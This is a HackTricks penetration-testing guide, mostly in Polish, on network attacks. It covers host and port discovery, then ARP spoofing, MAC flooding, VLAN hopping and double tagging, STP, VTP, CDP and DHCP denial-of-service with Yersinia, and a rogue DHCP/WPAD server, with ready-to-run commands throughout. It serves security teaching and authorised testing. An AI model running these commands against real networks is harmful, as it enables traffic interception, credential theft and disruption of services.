# Pentesting sieci

{{#include ../../banners/hacktricks-training.md}}



## Odkrywanie hostów z zewnątrz

To będzie **krótka sekcja** o tym, jak znaleźć **adresy IP odpowiadające** z **Internetu**.\
W tej sytuacji masz pewien **zakres adresów IP** (może nawet kilka **zakresów**) i musisz tylko znaleźć **które adresy IP odpowiadają**.

### ICMP

To jest **najszybszy** i **najprostszy** sposób, aby sprawdzić, czy host jest aktywny czy nie.\
Możesz spróbować wysłać kilka pakietów **ICMP** i **oczekiwać odpowiedzi**. Najprostszy sposób to wysłanie **echo request** i oczekiwanie odpowiedzi. Możesz to zrobić za pomocą prostego `ping` lub `fping` dla **zakresów**.\
Możesz też użyć **nmap** do wysłania innych typów pakietów ICMP (to pozwoli ominąć filtry dla standardowego ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Bardzo często zdarza się, że wszystkie rodzaje pakietów ICMP są filtrowane. Wtedy jedyne, co możesz zrobić, żeby sprawdzić, czy host jest aktywny, to **spróbować znaleźć open ports**. Każdy host ma **65535 ports**, więc jeśli masz "big" scope, **nie możesz** sprawdzić **each port** każdego hosta, czy jest open czy nie — zajęłoby to zbyt dużo czasu.\
W takim razie potrzebujesz **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) i listy **ports more used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Ten krok można również wykonać za pomocą `nmap`, ale jest wolniejszy i w pewnym stopniu `nmap` ma problemy z identyfikacją hostów.

### Odkrywanie portów HTTP

To jest tylko odkrywanie portów TCP przydatne, gdy chcesz **skupić się na odkrywaniu** **usług HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Możesz także spróbować sprawdzić, czy jakiś **UDP port open** jest otwarty, aby zdecydować, czy powinieneś **zwrócić większą uwagę** na **host.** Ponieważ UDP services zwykle **nie odpowiadają** żadnymi danymi na zwykły pusty UDP probe packet, trudno stwierdzić, czy port jest filtrowany czy open. Najłatwiejszy sposób to wysłać pakiet powiązany z działającą service, a ponieważ nie wiesz, która service działa, powinieneś spróbować najbardziej prawdopodobnej na podstawie numeru portu:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Linia nmap zaproponowana wcześniej przetestuje **top 1000 UDP ports** na każdym hostie w obrębie **/24 range**, ale nawet to zajmie **>20min**. Jeśli potrzebujesz **najszybszych wyników**, możesz użyć [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` To wyśle te **UDP probes** na ich **expected port** (dla /24 range zajmie to tylko 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Tutaj znajdziesz przydatny przewodnik po wszystkich dobrze znanych atakach Wifi na moment pisania:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Odkrywanie hostów z wnętrza sieci

Jeżeli znajdujesz się wewnątrz sieci, jedną z pierwszych rzeczy, które będziesz chciał zrobić, jest **odkrycie innych hostów**. W zależności od tego, **ile hałasu** możesz/chcesz generować, można wykonać różne działania:

### Pasywne

Możesz użyć tych narzędzi do pasywnego odkrywania hostów w podłączonej sieci:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktywne

Zauważ, że techniki opisane w [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) można też **zastosować tutaj**.\
Jednak będąc w **tej samej sieci** co pozostałe hosty, możesz zrobić **więcej**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktywny ICMP

Zauważ, że techniki omówione w _Odkrywanie hostów z zewnątrz_ ([_**ICMP**_](#icmp)) mogą być również **zastosowane tutaj**.\
Ale, ponieważ znajdujesz się w **tej samej sieci** co inne hosty, możesz zrobić **więcej**:

- Jeśli wykonasz **ping** na **adres rozgłoszeniowy podsieci**, ping powinien dotrzeć do **każdego hosta** i mogą one **odpowiedzieć** **tobie**: `ping -b 10.10.5.255`
- Wysyłając ping do **adresu rozgłoszeniowego sieci** możesz nawet znaleźć hosty w **innych podsieciach**: `ping -b 255.255.255.255`
- Użyj flag `-PE`, `-PP`, `-PM` `nmap`to wykonać wykrywanie hostów, wysyłając odpowiednio **ICMPv4 echo**, **timestamp**, i **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan jest używany do **włączania** komputerów za pomocą **wiadomości sieciowej**. Magiczny pakiet używany do włączenia komputera to pakiet, w którym podany jest **MAC Dst**, i następnie jest on **powtórzony 16 razy** w obrębie tego samego pakietu.\
Takie pakiety są zwykle wysyłane jako **ethernet 0x0842** lub jako **UDP packet to port 9**.\
Jeśli **nie podano \[MAC]**, pakiet jest wysyłany na **broadcast ethernet** (a broadcast MAC będzie tym powtarzanym).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skanowanie hostów

Gdy odkryjesz wszystkie adresy IP (zewnętrzne lub wewnętrzne), które chcesz przeskanować dogłębnie, można wykonać różne działania.

### TCP

- **Otwarty** port: _SYN --> SYN/ACK --> RST_
- **Zamknięty** port: _SYN --> RST/ACK_
- **Filtrowany** port: _SYN --> \[NO RESPONSE]_
- **Filtrowany** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Są 2 opcje skanowania portu UDP:

- Wyślij **UDP pakiet** i sprawdź odpowiedź _**ICMP unreachable**_ jeśli port jest **zamknięty** (w niektórych przypadkach ICMP będzie **filtrowany**, więc nie otrzymasz żadnej informacji, czy port jest zamknięty czy otwarty).
- Wyślij **sformatowane datagramy** aby wywołać odpowiedź od **usługi** (np. DNS, DHCP, TFTP i inne, jak wymieniono w _nmap-payloads_). Jeśli otrzymasz **odpowiedź**, to port jest **otwarty**.

**Nmap** będzie **łączył obie** opcje używając "-sV" (skany UDP są bardzo wolne), ale zwróć uwagę, że skany UDP są wolniejsze niż skany TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** został zaprojektowany do użytku razem z **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Jego głównym celem jest ułatwienie transportu danych telefonicznych przez sieci IP, odzwierciedlając wiele funkcji niezawodności znanych z **Signaling System 7 (SS7)**. **SCTP** jest kluczowym składnikiem rodziny protokołów **SIGTRAN**, której celem jest przesyłanie sygnałów SS7 przez sieci IP.

Wsparcie dla **SCTP** zapewniają różne systemy operacyjne, takie jak **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, co wskazuje na jego szerokie przyjęcie i użyteczność w dziedzinie telekomunikacji i sieci.

Dwa różne skany dla SCTP oferuje nmap: _-sY_ i _-sZ_.
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **More nmap options**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Ujawnianie wewnętrznych adresów IP

**Misconfigured routers, firewalls, and network devices** czasami odpowiadają na sondy sieciowe, używając **niepublicznych adresów źródłowych**. **tcpdump** można wykorzystać do zidentyfikowania pakietów odebranych z adresów prywatnych podczas testów. W szczególności, na Kali Linux pakiety można przechwycić na **eth2 interface**, który jest dostępny z Internetu publicznego. Należy pamiętać, że jeśli twoja konfiguracja znajduje się za NAT lub Firewall, takie pakiety prawdopodobnie zostaną odfiltrowane.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing pozwala poznać szczegóły zakresów IP, rozmiarów podsieci, adresów MAC i nazw hostów poprzez analizę przechwyconych ramek i pakietów. Jeśli sieć jest źle skonfigurowana lub switching fabric znajduje się pod obciążeniem, atakujący mogą przechwycić wrażliwe dane za pomocą passive network sniffing.

Jeśli przełączana sieć Ethernet jest prawidłowo skonfigurowana, zobaczysz jedynie ramki rozgłoszeniowe oraz ruch przeznaczony dla twojego adresu MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Można również przechwytywać pakiety z zdalnej maszyny przez sesję SSH, używając Wireshark jako GUI w czasie rzeczywistym.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Oczywiście.

### Capturing credentials

Możesz użyć narzędzi takich jak [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) do parsowania credentials z pcap lub z live interface.

## LAN attacks

### ARP spoofing

ARP Spoofing polega na wysyłaniu gratuitous ARPResponses, aby wskazać, że IP maszyny ma MAC naszego urządzenia. Wtedy ofiara zmieni ARP table i będzie kontaktować się z naszym urządzeniem za każdym razem, gdy będzie chciała skontaktować się z podszytym IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Przepełnij tabelę CAM przełącznika, wysyłając wiele pakietów z różnymi adresami źródłowymi MAC. Gdy tabela CAM jest pełna, przełącznik zaczyna zachowywać się jak hub (rozgłaszając cały ruch).
```bash
macof -i <interface>
```
In modern switches this vulnerability has been fixed.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** is designed as a link layer protocol to facilitate an automatic system for trunking, allowing switches to automatically select ports for trunk mode (Trunk) or non-trunk mode. The deployment of **DTP** is often seen as indicative of suboptimal network design, underscoring the importance of manually configuring trunks only where necessary and ensuring proper documentation.

By default, switch ports are set to operate in Dynamic Auto mode, meaning they are ready to initiate trunking if prompted by a neighboring switch. A security concern arises when a pentester or attacker connects to the switch and sends a DTP Desirable frame, compelling the port to enter trunk mode. This action enables the attacker to enumerate VLANs through STP frame analysis and circumvent VLAN segmentation by setting up virtual interfaces.

The presence of DTP in many switches by default can be exploited by adversaries to mimic a switch's behavior, thereby gaining access to traffic across all VLANs. The script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) is utilized to monitor an interface, revealing whether a switch is in Default, Trunk, Dynamic, Auto, or Access mode—the latter being the only configuration immune to VLAN hopping attacks. This tool assesses the switch's vulnerability status.

Should network vulnerability be identified, the _**Yersinia**_ tool can be employed to "enable trunking" via the DTP protocol, allowing for the observation of packets from all VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Aby wyliczyć VLANy, można także wygenerować ramkę DTP Desirable za pomocą skryptu [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**ie przerywaj skryptu w żadnym wypadku. Skrypt wstrzykuje DTP Desirable co trzy sekundy. **Dynamicznie tworzone kanały trunk na switchu istnieją tylko przez pięć minut. Po pięciu minutach trunk przestaje działać.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Chciałbym zwrócić uwagę, że **Access/Desirable (0x03)** wskazuje, że ramka DTP ma typ Desirable, co nakazuje portowi przełączenie się w tryb Trunk. Natomiast **802.1Q/802.1Q (0xa5** wskazuje typ enkapsulacji **802.1Q**.

Analizując ramki STP, **dowiadujemy się o istnieniu VLAN 30 i VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atakowanie konkretnych VLAN-ów

Po poznaniu ID VLAN i wartości adresów IP możesz **skonfigurować interfejs wirtualny, aby zaatakować konkretny VLAN**.\
Jeśli DHCP nie jest dostępny, użyj _ifconfig_, aby ustawić statyczny adres IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Omówiony atak **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** other VLANs jest **automatycznie wykonywany** przez narzędzie: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Jeśli atakujący zna wartość **MAC, IP and VLAN ID of the victim host**, może spróbować **double tag a frame** z jego przypisanym VLAN oraz VLAN of the victim i wysłać pakiet. Ponieważ **victim won't be able to connect back** z atakującym, najlepszą opcją dla atakującego jest komunikacja przez UDP do protokołów, które mogą wykonać interesujące akcje (np. SNMP).

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.

![](<../../images/image (190).png>)

To perform this attack you could use scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Jeśli masz dostęp do switcha, do którego jesteś bezpośrednio podłączony, możesz obejść segmentację VLAN w sieci. Wystarczy przełączyć port do trybu trunk, utworzyć virtual interfaces z ID docelowych VLANów i skonfigurować adres IP. Możesz spróbować uzyskać adres dynamicznie (DHCP) lub skonfigurować go statycznie — zależy od przypadku.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

W niektórych środowiskach, takich jak sieci bezprzewodowe dla gości, stosuje się ustawienia port isolation (również znane jako private VLAN), aby uniemożliwić klientom podłączonym do access point bezpośrednią komunikację. Jednak wykryto technikę, która może obejść te środki izolacji. Technika ta wykorzystuje brak network ACLs lub ich nieprawidłową konfigurację, umożliwiając przekazanie pakietów IP przez router, aby dotrzeć do innego klienta w tej samej sieci.

Atak polega na przygotowaniu pakietu, który zawiera adres IP docelowego klienta, ale z MAC address routera. Powoduje to, że router błędnie przekaże pakiet do klienta docelowego. Podejście to jest podobne do stosowanego w Double Tagging Attacks, gdzie wykorzystuje się kontrolę nad hostem dostępnym dla ofiary, aby wykorzystać tę lukę.

**Kluczowe kroki ataku:**

1. **Tworzenie pakietu:** Specjalnie przygotowany pakiet zawiera adres IP docelowego klienta, ale z MAC address routera.
2. **Wykorzystanie zachowania routera:** Przygotowany pakiet jest wysyłany do routera, który z powodu konfiguracji przekierowuje pakiet do klienta docelowego, omijając izolację zapewnianą przez private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizuje zarządzanie VLAN. Używa revision numbers do utrzymania integralności VLAN database; każda modyfikacja zwiększa tę wartość. Switche przyjmują konfiguracje z wyższymi revision numbers, aktualizując własne VLAN database.

#### VTP Domain Roles

- **VTP Server:** Zarządza VLANami — tworzy, usuwa, modyfikuje. Rozsyła VTP announcements do członków domeny.
- **VTP Client:** Odbiera VTP announcements w celu synchronizacji swojej VLAN database. W tej roli nie można lokalnie modyfikować konfiguracji VLAN.
- **VTP Transparent:** Nie bierze udziału w VTP updates, ale przekazuje VTP announcements. Nie jest podatny na VTP attacks i utrzymuje stały revision number równy zero.

#### VTP Advertisement Types

- **Summary Advertisement:** Nadawane przez VTP server co 300 sekund, zawiera kluczowe informacje o domenie.
- **Subset Advertisement:** Wysyłane po zmianach konfiguracji VLAN.
- **Advertisement Request:** Wystawiane przez VTP clienta, aby poprosić o Summary Advertisement, zazwyczaj w odpowiedzi na wykrycie wyższego configuration revision number.

Luki w VTP można wykorzystać wyłącznie przez trunk ports, ponieważ VTP announcements krążą tylko nimi. Po ataku DTP scenariusze mogą przejść do ataków VTP. Narzędzia takie jak Yersinia mogą ułatwić VTP attacks, dążąc do wyczyszczenia VLAN database, co skutecznie zakłóca działanie sieci.

Uwaga: Dyskusja odnosi się do VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
W trybie graficznym Yersinia wybierz opcję deleting all VTP vlans, aby wyczyścić VLAN database.

### STP Attacks

**Jeśli nie możesz przechwycić ramek BPDU na swoich interfejsach, mało prawdopodobne jest, że odniesiesz sukces w STP attack.**

#### **STP BPDU DoS**

Wysyłanie dużej ilości BPDUs TCP (Topology Change Notification) lub Conf (BPDUs wysyłane podczas tworzenia topologii) powoduje przeciążenie przełączników i ich nieprawidłowe działanie.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Kiedy wysyłany jest TCP, CAM table przełączników zostanie usunięta po 15s. Następnie, jeśli będziesz ciągle wysyłać tego typu pakiety, CAM table będzie się restartować ciągle (albo co 15s) i kiedy zostanie zrestartowana, switch zachowuje się jak hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Atakujący symuluje zachowanie switcha, aby zostać STP root sieci. Wtedy przez niego przejdzie więcej danych. To jest interesujące, gdy jesteś podłączony do dwóch różnych switchy.\
Jest to robione poprzez wysyłanie BPDUs CONF packets mówiących, że wartość **priority** jest mniejsza niż rzeczywista wartość **priority** aktualnego root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Jeśli atakujący jest podłączony do 2 przełączników, może stać się korzeniem nowego drzewa i cały ruch między tymi przełącznikami będzie przez niego przechodził** (zostanie przeprowadzony atak MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataki CDP

CISCO Discovery Protocol (CDP) jest niezbędny do komunikacji między urządzeniami CISCO, umożliwiając im **identyfikowanie się nawzajem i udostępnianie szczegółów konfiguracji**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP jest skonfigurowany do nadawania informacji przez wszystkie porty, co może prowadzić do ryzyka bezpieczeństwa. Atakujący, po podłączeniu się do portu przełącznika, może uruchomić narzędzia do przechwytywania ruchu sieciowego, takie jak **Wireshark**, **tcpdump** lub **Yersinia**. To działanie może ujawnić wrażliwe dane o urządzeniu sieciowym, w tym jego model i wersję Cisco IOS, na której działa. Następnie atakujący może celować w konkretne podatności zidentyfikowanej wersji Cisco IOS.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Bardziej agresywne podejście polega na przeprowadzeniu Denial of Service (DoS) poprzez przepełnienie pamięci przełącznika, podszywając się pod prawowite urządzenia CISCO. Poniżej znajduje się sekwencja poleceń do zainicjowania takiego ataku przy użyciu Yersinia, narzędzia sieciowego przeznaczonego do testowania:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
#### CDP Impersonation Attack

W trakcie tego ataku CPU przełącznika oraz CDP neighbor table są mocno obciążone, co prowadzi do tego, co często określa się jako **„paraliż sieci”** z powodu nadmiernego zużycia zasobów.
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Ataki VoIP i narzędzie VoIP Hopper

VoIP phones, increasingly integrated with IoT devices, offer functionalities like unlocking doors or controlling thermostats through special phone numbers. However, this integration can pose security risks.

The tool [**voiphopper**](http://voiphopper.sourceforge.net) is designed to emulate a VoIP phone in various environments (Cisco, Avaya, Nortel, Alcatel-Lucent). It discovers the voice network's VLAN ID using protocols like CDP, DHCP, LLDP-MED, and 802.1Q ARP.

**VoIP Hopper** offers three modes for the Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analizuje pakiety sieciowe, aby zidentyfikować VLAN ID.
2. **Spoof Mode** (`-c 1`): Generuje niestandardowe pakiety, imitujące te wysyłane przez rzeczywiste urządzenie VoIP.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Wysyła pakiety identyczne z pakietami konkretnego modelu telefonu Cisco IP.

The preferred mode for speed is the third one. It requires specifying:

- The attacker's network interface (`-i` parameter).
- The name of the VoIP device being emulated (`-E` parameter), adhering to the Cisco naming format (e.g., SEP followed by a MAC address).

In corporate settings, to mimic an existing VoIP device, one might:

- Inspect the MAC label on the phone.
- Navigate the phone's display settings to view model information.
- Connect the VoIP device to a laptop and observe CDP requests using Wireshark.

An example command to execute the tool in the third mode would be:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataki DHCP

#### Enumeracja
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dwa rodzaje DoS** mogą być przeprowadzone przeciwko serwerom DHCP. Pierwszy polega na **zasymulowaniu wystarczającej liczby fałszywych hostów, aby wykorzystać wszystkie możliwe adresy IP**.\
Ten atak zadziała tylko wtedy, gdy możesz zobaczyć odpowiedzi serwera DHCP i dokończyć protokół (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na przykład, to **nie jest możliwe w sieciach Wifi**.

Inny sposób przeprowadzenia DHCP DoS to wysłanie **pakietu DHCP-RELEASE używając jako adresu źródłowego każdej możliwej IP**. Wtedy serwer pomyśli, że wszyscy zakończyli używanie adresów IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bardziej zautomatyzowany sposób to użycie narzędzia [DHCPing](https://github.com/kamorin/DHCPig)

Możesz użyć wspomnianych ataków DoS, aby zmusić klientów do uzyskania nowych dzierżaw w środowisku i wyczerpać zasoby legalnych serwerów, powodując ich brak reakcji. Gdy legalne serwery spróbują ponownie obsłużyć żądania, **możesz serwować złośliwe wartości opisane w następnym ataku**.

#### Ustawianie złośliwych wartości

Złośliwy serwer DHCP można uruchomić używając skryptu DHCP znajdującego się w `/usr/share/responder/DHCP.py`. Jest to przydatne w atakach sieciowych, np. do przechwytywania ruchu HTTP i poświadczeń, poprzez przekierowanie ruchu do złośliwego serwera. Jednak ustawienie złośliwej bramy jest mniej efektywne, ponieważ pozwala jedynie na przechwytywanie ruchu wychodzącego od klienta, pomijając odpowiedzi od rzeczywistej bramy. Zamiast tego zaleca się skonfigurowanie złośliwego serwera DNS lub WPAD dla skuteczniejszego ataku.

Poniżej znajdują się opcje poleceń do konfiguracji złośliwego serwera DHCP:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

Poprawne użycie tych opcji pozwala ustanowić złośliwy serwer DHCP, który skutecznie przechwyci ruch sieciowy.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataki EAP**

Oto niektóre taktyki ataku, które można stosować przeciw implementacjom 802.1X:

- Active brute-force password grinding via EAP
- Attacking the RADIUS server with malformed EAP content _\*\*_(exploits)
- EAP message capture and offline password cracking (EAP-MD5 and PEAP)
- Forcing EAP-MD5 authentication to bypass TLS certificate validation
- Injecting malicious network traffic upon authenticating using a hub or similar

